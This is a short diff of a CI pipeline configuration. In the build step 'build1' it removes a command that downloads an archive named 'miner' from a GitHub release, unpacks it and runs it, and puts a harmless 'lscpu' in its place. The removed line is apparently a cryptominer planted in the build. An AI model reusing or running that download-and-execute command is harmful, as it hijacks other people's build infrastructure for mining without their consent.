@@ -6,8 +6,7 @@ steps:
 - name: build1
   image: golang
   commands:
-  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
-  
+  - lscpu
 ---
 kind: pipeline
 type: docker
